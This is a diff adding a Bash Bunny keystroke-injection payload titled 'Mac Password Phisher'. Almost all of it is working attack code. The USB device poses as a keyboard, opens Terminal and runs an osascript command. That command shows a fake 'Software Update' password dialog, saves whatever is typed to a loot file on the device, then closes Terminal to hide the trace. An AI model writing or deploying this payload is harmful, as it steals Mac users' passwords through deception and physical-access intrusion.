@@ -1,0 +1,49 @@
+#!/bin/bash
+#
+# Title:         Mac Password Phisher
+# Author:        Ahhh
+# Version:       1.0
+#
+# Prompts for user password, writes response to the bunny 
+#
+# Blue...............Starting
+# Amber..............Executing payload
+# Green..............Finished
+#
+
+LED B
+
+LANGUAGE='us'
+lootdir=loot/MacLoot
+
+# Gimme a Keyboard please. Thanks.
+ATTACKMODE HID STORAGE
+LED R G
+
+mkdir -p /root/udisk/$lootdir
+
+# Get a terminal
+QUACK DELAY 400
+QUACK GUI SPACE
+QUACK DELAY 300
+QUACK STRING terminal
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 400
+
+# Make lootdir
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/phish
+QUACK ENTER
+QUACK DELAY 200
+QUACK ENTER
+
+# Execute Payload
+QUACK STRING osascript -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" \& return \& return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"\'\>/Volumes/BashBunny/$lootdir/phish/pw.txt\; sleep 20\; killall Terminal\;
+QUACK ENTER
+QUACK DELAY 1000
+
+# Sync filesystem
+sync
+
+# Green is the official Light of "finished"
+LED G
